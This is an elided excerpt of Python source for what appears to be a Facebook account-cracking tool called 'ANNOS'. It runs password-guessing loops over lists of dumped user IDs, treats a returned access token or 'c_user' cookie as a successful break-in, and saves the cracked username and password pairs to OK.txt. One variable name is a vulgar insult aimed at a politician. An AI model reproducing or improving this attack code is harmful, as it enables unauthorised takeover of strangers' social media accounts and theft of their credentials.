...
def fb():
	os.system("clear")
	logo()
	print("[01] File Cloning ");time.sleep(0.1)
	print("[02] My Facebook Account  ");time.sleep(0.1)
	fbx = input("\n[➤] Choose : ")
	if fbx == '' or fbx == ' ':
		fb()
	elif fbx == '2' or fbx == '02':
		os.system('xdg-open https://www.facebook.com/MR.ANNOS007')
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            os.system("clear")
            logo()
            print('[01] Crack With Choice Pass')
            print('[02] Crack With Auto Pass')
            print(linesmall)
        except:
            print('\n[!] Dump File Not Found')
            input('\n[*] Press Enter To Back');__crack__().plerr();
            
        _jokowi_kontol_ = input("Choose : ")
        if _jokowi_kontol_ in ('M', 'm', '1', '01'):
                ...
                if pwek == '':
                    ...
                    def _sempak_(bse=None):
                        ...
                        if boy == '':
                            ...
                            print('\033[1;37mTotal IDs : %s ' % len(self.id))
                            print('\033[1;33mPlease Wait Process Have Been Started')
                            print(linesmall)
                            ...
                            #print('\nSalah')
                            exit()
                    #print('\n\t         PILIH Method CRACK NYA')
                    print('\n01.) Method 1 ')
                    print('02.) Method 2 ')
                    print('03.) Method 3 ')
                    _sempak_(pwek.split(','))
                    break
        elif _jokowi_kontol_ in ('D', 'd' , '2', '02'):
            os.system("clear")
            logo()
            print('\n------[ Method Crack ]-----')
            print('\n[01] Method 1 ')
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[ANNOS] %s/%s  \033[1;90mOK-:%s | \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                print('\r\033[1;90m[ANNOS-OK] %s | %s%s      '%(user,pw,))
                wrt = '%s - %s %s'%(user,pw,)
                ok.append(wrt)
                ...
                try:
                    ...
                    print('\r\033[1;91m[ANNOS-CP] %s | %s | %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                print('\r\033[1;91m[ANNOS-CP] %s | %s%s      '%(user,pw,tahun(user)))
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;90m[ANNOS-OK] %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;96m[ANNOS] %s/%s  \033[1;92m0K-:%s | \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
...
try:
	...
	skey.write(idcio)
	skey.close()
linesmall = "\033[1;97m════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;97m════════════════════════"
linelarg = "════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;97m════════════════════════"
ct = datetime.now()
n = ct.month
...
\033[0;91m║\033[1;92m➤\033[1;91m Github \033[1;97m：\033[1;93mTHE-DEMON-ANNOS              \033[1;91m      ║
